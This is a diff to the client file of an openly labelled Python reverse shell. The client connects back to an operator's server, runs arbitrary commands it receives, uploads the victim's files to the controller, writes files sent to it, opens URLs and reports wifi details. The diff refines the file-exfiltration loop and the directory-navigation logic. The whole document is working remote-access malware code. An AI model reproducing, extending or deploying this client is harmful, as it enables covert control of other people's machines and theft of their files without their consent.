@@ -4,7 +4,7 @@
 #   **python reverse shell**
 # coded by: oseid Aldary
 ##############################
-#Client_FILE
+#Client_FILE https://youtu.be/KpSh7DOICd4?list=PLnQp8N-IrjouH2p6wNBclVfmu7eqZNEhN&t=878
 import struct,socket,subprocess,os,platform,webbrowser as browser
 # server_config
 IP = "localhost" # Your server IP, default: localhost
@@ -46,14 +46,14 @@ def runCMD(cmd):
 
 def upload(cmd):
    filetosend = "".join(cmd.split(":download")).strip()
-   if not os.path.isfile(filetosend): controler.send("error: open: '{}': No such file on clinet side !\n".format(filetosend).encode("UTF-8"))
+   if not os.path.isfile(filetosend): controler.send("error: open: '{}': No such file on clinet machine !\n".format(filetosend).encode("UTF-8"))
    else:
        controler.send(b"true")
-       filee = open(filetosend, "rb")
-       for data in filee:
+       with open(filetosend, "rb") as wf:
+        for data in iter(lambda: wf.read(4100), b""):
          try:controler.send(data)
          except(KeyboardInterrupt,EOFError):
-          filee.close()
+          wf.close()
           controler.send(b":Aborted:")
           return
        controler.send(b":DONE:")
@@ -79,16 +79,14 @@ def download(cmd):
       wf.write(data)
      wf.close()
      controler.send(str(os.getcwd()+os.sep+filetodown).encode("UTF-8"))
-
 def browse(cmd):
     url = "".join(cmd.split(":browse")).strip()
     browser.open(url)
-
 def shell(senrev=senrev):
    global s
    global controler
    mainDIR = os.getcwd()
-   tmpdir = os.getcwd()
+   tmpdir=""
    controler = senrev(s)
    while True:
      cmd = controler.recv()
@@ -107,22 +105,24 @@ def shell(senrev=senrev):
        elif cmd == ":wifi": wifishow()
        elif "cd" in cmd:
                dirc = "".join(cmd.split("cd")).strip()
-               if not dirc.strip() : dirc = tmpdir
+               if not dirc.strip() : controler.send("{}\n".format(os.getcwd()).encode("UTF-8"))
                elif dirc == "-": 
-                 os.chdir(tmpdir)
-                 controler.send("Back to dir[ {}/ ]\n".format(tmpdir).encode("UTF-8"))
-                 continue
+                 if not tmpdir: controler.send(b"error: cd: old [PAWD] not set yet !\n")
+                 else:
+                   tmpdir2 = os.getcwd()
+                   os.chdir(tmpdir)
+                   controler.send("Back to dir[ {}/ ]\n".format(tmpdir).encode("UTF-8"))
+                   tmpdir = tmpdir2
                elif dirc =="--":
                   tmpdir = os.getcwd()
                   os.chdir(mainDIR)
                   controler.send("Back to first dir[ {}/ ]\n".format(mainDIR).encode("UTF-8"))
-                  continue
-               if not os.path.isdir(dirc):
-                controler.send("error: cd: '{}': No such file or directory on clinet machine !\n".format(dirc).encode("UTF-8"))
-                continue
-               tmpdir = os.getcwd()
-               os.chdir(dirc)
-               controler.send("Changed to dir[ {}/ ]\n".format(dirc).encode("UTF-8"))
+               else:
+                 if not os.path.isdir(dirc): controler.send("error: cd: '{}': No such file or directory on clinet machine !\n".format(dirc).encode("UTF-8"))
+                 else:
+                     tmpdir = os.getcwd()
+                     os.chdir(dirc)
+                     controler.send("Changed to dir[ {}/ ]\n".format(dirc).encode("UTF-8"))
        elif cmd == "pwd": controler.send(str(os.getcwd()+"\n").encode("UTF-8"))
        else:
                cmd_output = runCMD(cmd)
